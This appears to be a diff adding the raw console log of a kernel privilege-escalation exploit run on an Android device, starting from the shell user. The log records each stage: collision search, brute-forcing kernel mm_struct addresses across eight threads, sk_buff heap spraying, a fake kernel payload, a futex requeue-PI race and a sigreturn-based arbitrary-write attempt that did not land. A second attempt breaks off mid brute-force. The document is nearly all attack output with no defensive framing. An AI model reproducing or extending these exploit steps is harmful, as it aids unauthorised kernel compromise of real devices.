@@ -1,0 +1,475 @@
+[32m[+] [0mpreload starting pid=6631
+[32m[+] [0mstartup context pid=6631 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mbuild config pid=6631 label=pd2238_os6_163150_w10 slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=6631 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
+[32m[+] [0mdirect-map base=ffffff8040000000 slide=0000000000000000
+[32m[+] [0mckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=2bf821e8-684c-4686-9a6b-54269be64812 (odd: leaked scratch, even: aligned bootid+3)
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mpile-up verified: approx_time=2689
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007dde4c10c8
+[33m[*] [0m  0000006b466592c8
+[33m[*] [0m  0000006b46efb7d8
+[33m[*] [0m  0000006b4740d068
+[33m[*] [0m  0000006b475a9d48
+[33m[*] [0m  0000006b476c2610
+[33m[*] [0m  0000006b47e6e370
+[33m[*] [0m  0000006b481e0f00
+[33m[*] [0m  0000006b488b55a8
+[33m[*] [0m  0000006b48beff78
+[33m[*] [0m  0000006b491f5fa8
+[33m[*] [0m  0000006b4a4bf5f8
+[33m[*] [0m  0000006b4b150a80
+[33m[*] [0m  0000006b4b602010
+[33m[*] [0m  0000006b4b97abd0
+[33m[*] [0m  0000006b4c6f57a8
+[33m[*] [0mfound 15 collisisons
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
+[33m[*] [0m[  0] tested 100000 candidates, scanning=0xffffff8005948f00
+[33m[*] [0m[  1] tested 100000 candidates, scanning=0xffffff8805948f00
+[33m[*] [0m[  6] tested 100000 candidates, scanning=0xffffffb005948f00
+[33m[*] [0m[  5] tested 100000 candidates, scanning=0xffffffa805948f00
+[33m[*] [0m[  0] tested 200000 candidates, scanning=0xffffff800b2921c0
+[33m[*] [0m[  1] tested 200000 candidates, scanning=0xffffff880b2921c0
+[33m[*] [0m[  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
+[33m[*] [0m[  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
+[33m[*] [0m[  2] tested 100000 candidates, scanning=0xffffff9005948f00
+[33m[*] [0m[  1] tested 300000 candidates, scanning=0xffffff8810bdb480
+[33m[*] [0m[  0] tested 300000 candidates, scanning=0xffffff8010bdb480
+[33m[*] [0m[  6] tested 300000 candidates, scanning=0xffffffb010bdb480
+[33m[*] [0m[  3] tested 100000 candidates, scanning=0xffffff9805948f00
+[33m[*] [0m[  1] tested 400000 candidates, scanning=0xffffff8816524740
+[33m[*] [0m[  7] tested 100000 candidates, scanning=0xffffffb805948f00
+[33m[*] [0m[  5] tested 300000 candidates, scanning=0xffffffa810bdb480
+[33m[*] [0m[  6] tested 400000 candidates, scanning=0xffffffb016524740
+[33m[*] [0m[  4] tested 100000 candidates, scanning=0xffffffa005948f00
+[33m[*] [0m[  3] tested 200000 candidates, scanning=0xffffff980b2921c0
+[33m[*] [0m[  5] tested 400000 candidates, scanning=0xffffffa816524740
+[33m[*] [0m[  2] tested 200000 candidates, scanning=0xffffff900b2921c0
+[33m[*] [0m[  6] tested 500000 candidates, scanning=0xffffffb01be6da00
+[33m[*] [0m[  1] tested 500000 candidates, scanning=0xffffff881be6da00
+[33m[*] [0m[  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
+[33m[*] [0m[  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
+[33m[*] [0m[  5] tested 500000 candidates, scanning=0xffffffa81be6da00
+[33m[*] [0m[  6] tested 600000 candidates, scanning=0xffffffb0217b6cc0
+[33m[*] [0m[  7] tested 300000 candidates, scanning=0xffffffb810bdb480
+[33m[*] [0m[  0] tested 400000 candidates, scanning=0xffffff8016524740
+[33m[*] [0m[  1] tested 600000 candidates, scanning=0xffffff88217b6cc0
+[33m[*] [0m[  2] tested 300000 candidates, scanning=0xffffff9010bdb480
+[33m[*] [0m[  4] tested 300000 candidates, scanning=0xffffffa010bdb480
+[33m[*] [0m[  5] tested 600000 candidates, scanning=0xffffffa8217b6cc0
+[33m[*] [0m[  6] tested 700000 candidates, scanning=0xffffffb0270fff80
+[33m[*] [0m[  2] tested 400000 candidates, scanning=0xffffff9016524740
+[33m[*] [0m[  3] tested 300000 candidates, scanning=0xffffff9810bdb480
+[33m[*] [0m[  7] tested 400000 candidates, scanning=0xffffffb816524740
+[33m[*] [0m[  0] tested 500000 candidates, scanning=0xffffff801be6da00
+[33m[*] [0m[  4] tested 400000 candidates, scanning=0xffffffa016524740
+[33m[*] [0m[  6] tested 800000 candidates, scanning=0xffffffb02ca48f00
+[33m[*] [0m[  7] tested 500000 candidates, scanning=0xffffffb81be6da00
+[33m[*] [0m[  3] tested 400000 candidates, scanning=0xffffff9816524740
+[33m[*] [0m[  5] tested 700000 candidates, scanning=0xffffffa8270fff80
+[33m[*] [0m[  4] tested 500000 candidates, scanning=0xffffffa01be6da00
+[33m[*] [0m[  1] tested 700000 candidates, scanning=0xffffff88270fff80
+[33m[*] [0m[  2] tested 500000 candidates, scanning=0xffffff901be6da00
+[33m[*] [0m[  0] tested 600000 candidates, scanning=0xffffff80217b6cc0
+[33m[*] [0m[  6] tested 900000 candidates, scanning=0xffffffb0323921c0
+[33m[*] [0m[  3] tested 500000 candidates, scanning=0xffffff981be6da00
+[33m[*] [0m[  5] tested 800000 candidates, scanning=0xffffffa82ca48f00
+[33m[*] [0m[  4] tested 600000 candidates, scanning=0xffffffa0217b6cc0
+[33m[*] [0m[  7] tested 600000 candidates, scanning=0xffffffb8217b6cc0
+[33m[*] [0m[  1] tested 800000 candidates, scanning=0xffffff882ca48f00
+[33m[*] [0m[  3] tested 600000 candidates, scanning=0xffffff98217b6cc0
+[33m[*] [0m[  4] tested 700000 candidates, scanning=0xffffffa0270fff80
+[33m[*] [0m[  0] tested 700000 candidates, scanning=0xffffff80270fff80
+[33m[*] [0m[  2] tested 600000 candidates, scanning=0xffffff90217b6cc0
+[33m[*] [0m[  5] tested 900000 candidates, scanning=0xffffffa8323921c0
+[33m[*] [0m[  1] tested 900000 candidates, scanning=0xffffff88323921c0
+[33m[*] [0m[  6] tested 1000000 candidates, scanning=0xffffffb037cdb480
+[33m[*] [0m[  4] tested 800000 candidates, scanning=0xffffffa02ca48f00
+[33m[*] [0m[  7] tested 700000 candidates, scanning=0xffffffb8270fff80
+[33m[*] [0m[  0] tested 800000 candidates, scanning=0xffffff802ca48f00
+[33m[*] [0m[  2] tested 700000 candidates, scanning=0xffffff90270fff80
+[33m[*] [0m[  3] tested 700000 candidates, scanning=0xffffff98270fff80
+[33m[*] [0m[  6] tested 1100000 candidates, scanning=0xffffffb03d624740
+[33m[*] [0m[  7] tested 800000 candidates, scanning=0xffffffb82ca48f00
+[33m[*] [0m[  4] tested 900000 candidates, scanning=0xffffffa0323921c0
+[33m[*] [0m[  1] tested 1000000 candidates, scanning=0xffffff8837cdb480
+[33m[*] [0m[  0] tested 900000 candidates, scanning=0xffffff80323921c0
+[33m[*] [0m[  5] tested 1000000 candidates, scanning=0xffffffa837cdb480
+[33m[*] [0m[  1] tested 1100000 candidates, scanning=0xffffff883d624740
+[33m[*] [0m[  4] tested 1000000 candidates, scanning=0xffffffa037cdb480
+[33m[*] [0m[  2] tested 800000 candidates, scanning=0xffffff902ca48f00
+[33m[*] [0m[  6] tested 1200000 candidates, scanning=0xffffffb042f6da00
+[33m[*] [0m[  0] tested 1000000 candidates, scanning=0xffffff8037cdb480
+[33m[*] [0m[  5] tested 1100000 candidates, scanning=0xffffffa83d624740
+[33m[*] [0m[  7] tested 900000 candidates, scanning=0xffffffb8323921c0
+[33m[*] [0m[  3] tested 800000 candidates, scanning=0xffffff982ca48f00
+[33m[*] [0m[  1] tested 1200000 candidates, scanning=0xffffff8842f6da00
+[33m[*] [0m[  2] tested 900000 candidates, scanning=0xffffff90323921c0
+[33m[*] [0m[  4] tested 1100000 candidates, scanning=0xffffffa03d624740
+[33m[*] [0m[  0] tested 1100000 candidates, scanning=0xffffff803d624740
+[33m[*] [0m[  6] tested 1300000 candidates, scanning=0xffffffb0488b6cc0
+[33m[*] [0m[  5] tested 1200000 candidates, scanning=0xffffffa842f6da00
+[33m[*] [0m[  3] tested 900000 candidates, scanning=0xffffff98323921c0
+[33m[*] [0m[  2] tested 1000000 candidates, scanning=0xffffff9037cdb480
+[33m[*] [0m[  7] tested 1000000 candidates, scanning=0xffffffb837cdb480
+[33m[*] [0m[  4] tested 1200000 candidates, scanning=0xffffffa042f6da00
+[33m[*] [0m[  0] tested 1200000 candidates, scanning=0xffffff8042f6da00
+[33m[*] [0m[  3] tested 1000000 candidates, scanning=0xffffff9837cdb480
+[33m[*] [0m[  6] tested 1400000 candidates, scanning=0xffffffb04e1fff80
+[33m[*] [0m[  1] tested 1300000 candidates, scanning=0xffffff88488b6cc0
+[33m[*] [0m[  7] tested 1100000 candidates, scanning=0xffffffb83d624740
+[33m[*] [0m[  2] tested 1100000 candidates, scanning=0xffffff903d624740
+[33m[*] [0m[  0] tested 1300000 candidates, scanning=0xffffff80488b6cc0
+[33m[*] [0m[  4] tested 1300000 candidates, scanning=0xffffffa0488b6cc0
+[33m[*] [0m[  6] tested 1500000 candidates, scanning=0xffffffb053b48f00
+[33m[*] [0m[  5] tested 1300000 candidates, scanning=0xffffffa8488b6cc0
+[33m[*] [0m[  2] tested 1200000 candidates, scanning=0xffffff9042f6da00
+[33m[*] [0m[  4] tested 1400000 candidates, scanning=0xffffffa04e1fff80
+[33m[*] [0m[  7] tested 1200000 candidates, scanning=0xffffffb842f6da00
+[33m[*] [0m[  1] tested 1400000 candidates, scanning=0xffffff884e1fff80
+[33m[*] [0m[  5] tested 1400000 candidates, scanning=0xffffffa84e1fff80
+[33m[*] [0m[  6] tested 1600000 candidates, scanning=0xffffffb0594921c0
+[33m[*] [0m[  7] tested 1300000 candidates, scanning=0xffffffb8488b6cc0
+[33m[*] [0m[  0] tested 1400000 candidates, scanning=0xffffff804e1fff80
+[33m[*] [0m[  4] tested 1500000 candidates, scanning=0xffffffa053b48f00
+[33m[*] [0m[  1] tested 1500000 candidates, scanning=0xffffff8853b48f00
+[33m[*] [0m[  3] tested 1100000 candidates, scanning=0xffffff983d624740
+[33m[*] [0m[  0] tested 1500000 candidates, scanning=0xffffff8053b48f00
+[33m[*] [0m[  6] tested 1700000 candidates, scanning=0xffffffb05eddb480
+[33m[*] [0m[  7] tested 1400000 candidates, scanning=0xffffffb84e1fff80
+[33m[*] [0m[  4] tested 1600000 candidates, scanning=0xffffffa0594921c0
+[33m[*] [0m[  0] tested 1600000 candidates, scanning=0xffffff80594921c0
+[33m[*] [0m[  1] tested 1600000 candidates, scanning=0xffffff88594921c0
+[33m[*] [0m[  5] tested 1500000 candidates, scanning=0xffffffa853b48f00
+[33m[*] [0m[  2] tested 1300000 candidates, scanning=0xffffff90488b6cc0
+[33m[*] [0m[  7] tested 1500000 candidates, scanning=0xffffffb853b48f00
+[33m[*] [0m[  3] tested 1200000 candidates, scanning=0xffffff9842f6da00
+[33m[*] [0m[  4] tested 1700000 candidates, scanning=0xffffffa05eddb480
+[33m[*] [0m[  6] tested 1800000 candidates, scanning=0xffffffb064724740
+[33m[*] [0m[  1] tested 1700000 candidates, scanning=0xffffff885eddb480
+[33m[*] [0m[  2] tested 1400000 candidates, scanning=0xffffff904e1fff80
+[33m[*] [0m[  5] tested 1600000 candidates, scanning=0xffffffa8594921c0
+[33m[*] [0m[  7] tested 1600000 candidates, scanning=0xffffffb8594921c0
+[33m[*] [0m[  0] tested 1700000 candidates, scanning=0xffffff805eddb480
+[33m[*] [0m[  3] tested 1300000 candidates, scanning=0xffffff98488b6cc0
+[33m[*] [0m[  6] tested 1900000 candidates, scanning=0xffffffb06a06da00
+[33m[*] [0m[  5] tested 1700000 candidates, scanning=0xffffffa85eddb480
+[33m[*] [0m[  2] tested 1500000 candidates, scanning=0xffffff9053b48f00
+[33m[*] [0m[  0] tested 1800000 candidates, scanning=0xffffff8064724740
+[33m[*] [0m[  7] tested 1700000 candidates, scanning=0xffffffb85eddb480
+[33m[*] [0m[  4] tested 1800000 candidates, scanning=0xffffffa064724740
+[33m[*] [0m[  1] tested 1800000 candidates, scanning=0xffffff8864724740
+[33m[*] [0m[  6] tested 2000000 candidates, scanning=0xffffffb06f9b6cc0
+[33m[*] [0m[  5] tested 1800000 candidates, scanning=0xffffffa864724740
+[33m[*] [0m[  3] tested 1400000 candidates, scanning=0xffffff984e1fff80
+[33m[*] [0m[  2] tested 1600000 candidates, scanning=0xffffff90594921c0
+[33m[*] [0m[  4] tested 1900000 candidates, scanning=0xffffffa06a06da00
+[33m[*] [0m[  0] tested 1900000 candidates, scanning=0xffffff806a06da00
+[33m[*] [0m[  5] tested 1900000 candidates, scanning=0xffffffa86a06da00
+[33m[*] [0m[  1] tested 1900000 candidates, scanning=0xffffff886a06da00
+[33m[*] [0m[  6] tested 2100000 candidates, scanning=0xffffffb0752fff80
+[33m[*] [0m[  7] tested 1800000 candidates, scanning=0xffffffb864724740
+[33m[*] [0m[  4] tested 2000000 candidates, scanning=0xffffffa06f9b6cc0
+[33m[*] [0m[  1] tested 2000000 candidates, scanning=0xffffff886f9b6cc0
+[33m[*] [0m[  5] tested 2000000 candidates, scanning=0xffffffa86f9b6cc0
+[33m[*] [0m[  2] tested 1700000 candidates, scanning=0xffffff905eddb480
+[33m[*] [0m[  7] tested 1900000 candidates, scanning=0xffffffb86a06da00
+[33m[*] [0m[  3] tested 1500000 candidates, scanning=0xffffff9853b48f00
+[33m[*] [0m[  0] tested 2000000 candidates, scanning=0xffffff806f9b6cc0
+[33m[*] [0m[  6] tested 2200000 candidates, scanning=0xffffffb07ac48f00
+[33m[*] [0m[  4] tested 2100000 candidates, scanning=0xffffffa0752fff80
+[33m[*] [0m[  3] tested 1600000 candidates, scanning=0xffffff98594921c0
+[33m[*] [0m[  2] tested 1800000 candidates, scanning=0xffffff9064724740
+[33m[*] [0m[  7] tested 2000000 candidates, scanning=0xffffffb86f9b6cc0
+[33m[*] [0m[  1] tested 2100000 candidates, scanning=0xffffff88752fff80
+[33m[*] [0m[  6] tested 2300000 candidates, scanning=0xffffffb0805921c0
+[33m[*] [0m[  5] tested 2100000 candidates, scanning=0xffffffa8752fff80
+[33m[*] [0m[  3] tested 1700000 candidates, scanning=0xffffff985eddb480
+[33m[*] [0m[  1] tested 2200000 candidates, scanning=0xffffff887ac48f00
+[33m[*] [0m[  2] tested 1900000 candidates, scanning=0xffffff906a06da00
+[33m[*] [0m[  0] tested 2100000 candidates, scanning=0xffffff80752fff80
+[33m[*] [0m[  7] tested 2100000 candidates, scanning=0xffffffb8752fff80
+[33m[*] [0m[  3] tested 1800000 candidates, scanning=0xffffff9864724740
+[33m[*] [0m[  4] tested 2200000 candidates, scanning=0xffffffa07ac48f00
+[33m[*] [0m[  6] tested 2400000 candidates, scanning=0xffffffb085edb480
+[33m[*] [0m[  7] tested 2200000 candidates, scanning=0xffffffb87ac48f00
+[33m[*] [0m[  1] tested 2300000 candidates, scanning=0xffffff88805921c0
+[33m[*] [0m[  6] tested 2500000 candidates, scanning=0xffffffb08b824740
+[33m[*] [0m[  0] tested 2200000 candidates, scanning=0xffffff807ac48f00
+[33m[*] [0m[  5] tested 2200000 candidates, scanning=0xffffffa87ac48f00
+[33m[*] [0m[  2] tested 2000000 candidates, scanning=0xffffff906f9b6cc0
+[33m[*] [0m[  4] tested 2300000 candidates, scanning=0xffffffa0805921c0
+[33m[*] [0m[  7] tested 2300000 candidates, scanning=0xffffffb8805921c0
+[33m[*] [0m[  3] tested 1900000 candidates, scanning=0xffffff986a06da00
+[33m[*] [0m[  1] tested 2400000 candidates, scanning=0xffffff8885edb480
+[33m[*] [0m[  0] thread done, tested 2265680 candidates
+[33m[*] [0m[  7] thread done, tested 2300000 candidates
+[33m[*] [0m[  2] thread done, tested 2046002 candidates
+[33m[*] [0m[  5] thread done, tested 2297267 candidates
+[33m[*] [0m[  6] thread done, tested 2530315 candidates
+[33m[*] [0m[  1] thread done, tested 2411611 candidates
+[33m[*] [0m[  4] thread done, tested 2325726 candidates
+[33m[*] [0m[  3] thread done, tested 1900000 candidates
+[33m[*] [0mprepare_kernel_page leaked_mm=ffffff807e6eddc0 base=ffffff807e6e8000 mode=0
+[33m[*] [0mfake payload mode=0 write_shape=1 lock=ffffff807e6e84d0 w0=ffffff807e6e93a0 task=ffffff807e6ea380 write_parent=ffffff807e6ea178 write_right=0000000000000000 write_left=0000000000000000
+[33m[*] [0msk_buff reclaim send 1/4 ret=65536 errno=0
+[33m[*] [0msk_buff reclaim send 2/4 ret=65536 errno=0
+[33m[*] [0msk_buff reclaim send 3/4 ret=65536 errno=0
+[33m[*] [0msk_buff reclaim send 4/4 ret=65536 errno=0
+[33m[*] [0mdone
+[32m[+] [0mheap_spray: page_base=ffffff807e6e8000 (leaked mm_struct)
+[32m[+] [0mckpt: route enter
+[32m[+] [0mckpt: route threads spawned
+[32m[+] [0mckpt: route ready waiter_waiting=1 owner_started=1
+[32m[+] [0mckpt: route CMP_REQUEUE_PI ret=-1 errno=35
+[32m[+] [0mckpt: waiter WAIT_REQUEUE_PI ret=-1 errno=110 tid=12126 sigalrm=0 setprio=0/0
+[32m[+] [0mckpt: do_sigret enter page=ffffff807e6e8000 lock=ffffff807e6e84d0 fops=ffffff807e6e8180
+[32m[+] [0mckpt: sigframe ready sf=0x7dde0f2db0 reserved=0x7dde0f3000 align16=1
+[32m[+] [0mckpt: sigret attempt=1 before prctl+sigreturn shape=1 target=ffffff807e6ea180
+[32m[+] [0mckpt: sigret hold done attempt=1 prctl_ret=-1 prctl_errno=22 calls=1 walks=0 proof=scratch(leaked) shape=1 tree_pc=ffffff807e6ea178 tree_right=ffffff807e6e8180 task=ffffff807e6ea380 target=ffffff807e6ea180
+[32m[+] [0mckpt: consumer walk seq=1 call=0 ret=0 errno=0 policy=0->3(want 3) nice=19 walked=1 armed=1/0 tid=12126
+[32m[+] [0mckpt: consumer seq=1 done calls=0 walked=1
+[32m[+] [0mSCRATCH-DIAG total_recv=262144 diffs=0 write_value_landed=0 expect=ffffff807e6e8180
+[32m[+] [0mckpt: SCRATCH-WRITE-PROOF attempt=1 walks=0 target=ffffff807e6ea180 value=ffffff807e6e8180 landed=0
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mpile-up verified: approx_time=209
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007dde4c10c8
+[33m[*] [0m  0000006b42c26130
+[33m[*] [0m  0000006b43171b88
+[33m[*] [0m  0000006b439e8f40
+[33m[*] [0m  0000006b4405d2e8
+[33m[*] [0m  0000006b44986c30
+[33m[*] [0m  0000006b45b8fc78
+[33m[*] [0m  0000006b46684420
+[33m[*] [0m  0000006b46b91c88
+[33m[*] [0m  0000006b474b1588
+[33m[*] [0m  0000006b480e4720
+[33m[*] [0m  0000006b4832e970
+[33m[*] [0m  0000006b4890e870
+[33m[*] [0m  0000006b490190c8
+[33m[*] [0m  0000006b492ae570
+[33m[*] [0m  0000006b49cc8640
+[33m[*] [0mfound 15 collisisons
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
+[33m[*] [0m[  0] tested 100000 candidates, scanning=0xffffff8005948f00
+[33m[*] [0m[  5] tested 100000 candidates, scanning=0xffffffa805948f00
+[33m[*] [0m[  3] tested 100000 candidates, scanning=0xffffff9805948f00
+[33m[*] [0m[  2] tested 100000 candidates, scanning=0xffffff9005948f00
+[33m[*] [0m[  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
+[33m[*] [0m[  4] tested 100000 candidates, scanning=0xffffffa005948f00
+[33m[*] [0m[  1] tested 100000 candidates, scanning=0xffffff8805948f00
+[33m[*] [0m[  7] tested 100000 candidates, scanning=0xffffffb805948f00
+[33m[*] [0m[  0] tested 200000 candidates, scanning=0xffffff800b2921c0
+[33m[*] [0m[  3] tested 200000 candidates, scanning=0xffffff980b2921c0
+[33m[*] [0m[  2] tested 200000 candidates, scanning=0xffffff900b2921c0
+[33m[*] [0m[  5] tested 300000 candidates, scanning=0xffffffa810bdb480
+[33m[*] [0m[  6] tested 100000 candidates, scanning=0xffffffb005948f00
+[33m[*] [0m[  0] tested 300000 candidates, scanning=0xffffff8010bdb480
+[33m[*] [0m[  2] tested 300000 candidates, scanning=0xffffff9010bdb480
+[33m[*] [0m[  5] tested 400000 candidates, scanning=0xffffffa816524740
+[33m[*] [0m[  3] tested 300000 candidates, scanning=0xffffff9810bdb480
+[33m[*] [0m[  2] tested 400000 candidates, scanning=0xffffff9016524740
+[33m[*] [0m[  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
+[33m[*] [0m[  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
+[33m[*] [0m[  0] tested 400000 candidates, scanning=0xffffff8016524740
+[33m[*] [0m[  5] tested 500000 candidates, scanning=0xffffffa81be6da00
+[33m[*] [0m[  2] tested 500000 candidates, scanning=0xffffff901be6da00
+[33m[*] [0m[  3] tested 400000 candidates, scanning=0xffffff9816524740
+[33m[*] [0m[  5] tested 600000 candidates, scanning=0xffffffa8217b6cc0
+[33m[*] [0m[  2] tested 600000 candidates, scanning=0xffffff90217b6cc0
+[33m[*] [0m[  0] tested 500000 candidates, scanning=0xffffff801be6da00
+[33m[*] [0m[  5] tested 700000 candidates, scanning=0xffffffa8270fff80
+[33m[*] [0m[  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
+[33m[*] [0m[  2] tested 700000 candidates, scanning=0xffffff90270fff80
+[33m[*] [0m[  1] tested 200000 candidates, scanning=0xffffff880b2921c0
+[33m[*] [0m[  3] tested 500000 candidates, scanning=0xffffff981be6da00
+[33m[*] [0m[  5] tested 800000 candidates, scanning=0xffffffa82ca48f00
+[33m[*] [0m[  6] tested 300000 candidates, scanning=0xffffffb010bdb480
+[33m[*] [0m[  4] tested 300000 candidates, scanning=0xffffffa010bdb480
+[33m[*] [0m[  2] tested 800000 candidates, scanning=0xffffff902ca48f00
+[33m[*] [0m[  7] tested 300000 candidates, scanning=0xffffffb810bdb480
+[33m[*] [0m[  5] tested 900000 candidates, scanning=0xffffffa8323921c0
+[33m[*] [0m[  1] tested 300000 candidates, scanning=0xffffff8810bdb480
+[33m[*] [0m[  2] tested 900000 candidates, scanning=0xffffff90323921c0
+[33m[*] [0m[  5] tested 1000000 candidates, scanning=0xffffffa837cdb480
+[33m[*] [0m[  0] tested 600000 candidates, scanning=0xffffff80217b6cc0
+[33m[*] [0m[  3] tested 600000 candidates, scanning=0xffffff98217b6cc0
+[33m[*] [0m[  6] tested 400000 candidates, scanning=0xffffffb016524740
+[33m[*] [0m[  5] tested 1100000 candidates, scanning=0xffffffa83d624740
+[33m[*] [0m[  1] tested 400000 candidates, scanning=0xffffff8816524740
+[33m[*] [0m[  4] tested 400000 candidates, scanning=0xffffffa016524740
+[33m[*] [0m[  6] tested 500000 candidates, scanning=0xffffffb01be6da00
+[33m[*] [0m[  2] tested 1000000 candidates, scanning=0xffffff9037cdb480
+[33m[*] [0m[  5] tested 1200000 candidates, scanning=0xffffffa842f6da00
+[33m[*] [0m[  1] tested 500000 candidates, scanning=0xffffff881be6da00
+[33m[*] [0m[  7] tested 400000 candidates, scanning=0xffffffb816524740
+[33m[*] [0m[  6] tested 600000 candidates, scanning=0xffffffb0217b6cc0
+[33m[*] [0m[  2] tested 1100000 candidates, scanning=0xffffff903d624740
+[33m[*] [0m[  0] tested 700000 candidates, scanning=0xffffff80270fff80
+[33m[*] [0m[  3] tested 700000 candidates, scanning=0xffffff98270fff80
+[33m[*] [0m[  5] tested 1300000 candidates, scanning=0xffffffa8488b6cc0
+[33m[*] [0m[  6] tested 700000 candidates, scanning=0xffffffb0270fff80
+[33m[*] [0m[  7] tested 500000 candidates, scanning=0xffffffb81be6da00
+[33m[*] [0m[  4] tested 500000 candidates, scanning=0xffffffa01be6da00
+[33m[*] [0m[  3] tested 800000 candidates, scanning=0xffffff982ca48f00
+[33m[*] [0m[  6] tested 800000 candidates, scanning=0xffffffb02ca48f00
+[33m[*] [0m[  7] tested 600000 candidates, scanning=0xffffffb8217b6cc0
+[33m[*] [0m[  3] tested 900000 candidates, scanning=0xffffff98323921c0
+[33m[*] [0m[  1] tested 600000 candidates, scanning=0xffffff88217b6cc0
+[33m[*] [0m[  2] tested 1200000 candidates, scanning=0xffffff9042f6da00
+[33m[*] [0m[  6] tested 900000 candidates, scanning=0xffffffb0323921c0
+[33m[*] [0m[  7] tested 700000 candidates, scanning=0xffffffb8270fff80
+[33m[*] [0m[  3] tested 1000000 candidates, scanning=0xffffff9837cdb480
+[33m[*] [0m[  5] tested 1400000 candidates, scanning=0xffffffa84e1fff80
+[33m[*] [0m[  4] tested 600000 candidates, scanning=0xffffffa0217b6cc0
+[33m[*] [0m[  2] tested 1300000 candidates, scanning=0xffffff90488b6cc0
+[33m[*] [0m[  7] tested 800000 candidates, scanning=0xffffffb82ca48f00
+[33m[*] [0m[  1] tested 700000 candidates, scanning=0xffffff88270fff80
+[33m[*] [0m[  6] tested 1000000 candidates, scanning=0xffffffb037cdb480
+[33m[*] [0m[  0] tested 800000 candidates, scanning=0xffffff802ca48f00
+[33m[*] [0m[  5] tested 1500000 candidates, scanning=0xffffffa853b48f00
+[33m[*] [0m[  4] tested 700000 candidates, scanning=0xffffffa0270fff80
+[33m[*] [0m[  6] tested 1100000 candidates, scanning=0xffffffb03d624740
+[33m[*] [0m[  3] tested 1100000 candidates, scanning=0xffffff983d624740
+[33m[*] [0m[  4] tested 800000 candidates, scanning=0xffffffa02ca48f00
+[33m[*] [0m[  7] tested 900000 candidates, scanning=0xffffffb8323921c0
+[33m[*] [0m[  1] tested 800000 candidates, scanning=0xffffff882ca48f00
+[33m[*] [0m[  6] tested 1200000 candidates, scanning=0xffffffb042f6da00
+[33m[*] [0m[  4] tested 900000 candidates, scanning=0xffffffa0323921c0
+[33m[*] [0m[  0] tested 900000 candidates, scanning=0xffffff80323921c0
+[33m[*] [0m[  2] tested 1400000 candidates, scanning=0xffffff904e1fff80
+[33m[*] [0m[  5] tested 1600000 candidates, scanning=0xffffffa8594921c0
+[33m[*] [0m[  6] tested 1300000 candidates, scanning=0xffffffb0488b6cc0
+[33m[*] [0m[  4] tested 1000000 candidates, scanning=0xffffffa037cdb480
+[33m[*] [0m[  1] tested 900000 candidates, scanning=0xffffff88323921c0
+[33m[*] [0m[  5] tested 1700000 candidates, scanning=0xffffffa85eddb480
+[33m[*] [0m[  3] tested 1200000 candidates, scanning=0xffffff9842f6da00
+[33m[*] [0m[  4] tested 1100000 candidates, scanning=0xffffffa03d624740
+[33m[*] [0m[  5] tested 1800000 candidates, scanning=0xffffffa864724740
+[33m[*] [0m[  6] tested 1400000 candidates, scanning=0xffffffb04e1fff80
+[33m[*] [0m[  2] tested 1500000 candidates, scanning=0xffffff9053b48f00
+[33m[*] [0m[  0] tested 1000000 candidates, scanning=0xffffff8037cdb480
+[33m[*] [0m[  4] tested 1200000 candidates, scanning=0xffffffa042f6da00
+[33m[*] [0m[  5] tested 1900000 candidates, scanning=0xffffffa86a06da00
+[33m[*] [0m[  2] tested 1600000 candidates, scanning=0xffffff90594921c0
+[33m[*] [0m[  7] tested 1000000 candidates, scanning=0xffffffb837cdb480
+[33m[*] [0m[  4] tested 1300000 candidates, scanning=0xffffffa0488b6cc0
+[33m[*] [0m[  5] tested 2000000 candidates, scanning=0xffffffa86f9b6cc0
+[33m[*] [0m[  3] tested 1300000 candidates, scanning=0xffffff98488b6cc0
+[33m[*] [0m[  1] tested 1000000 candidates, scanning=0xffffff8837cdb480
+[33m[*] [0m[  6] tested 1500000 candidates, scanning=0xffffffb053b48f00
+[33m[*] [0m[  5] tested 2100000 candidates, scanning=0xffffffa8752fff80
+[33m[*] [0m[  4] tested 1400000 candidates, scanning=0xffffffa04e1fff80
+[33m[*] [0m[  6] tested 1600000 candidates, scanning=0xffffffb0594921c0
+[33m[*] [0m[  0] tested 1100000 candidates, scanning=0xffffff803d624740
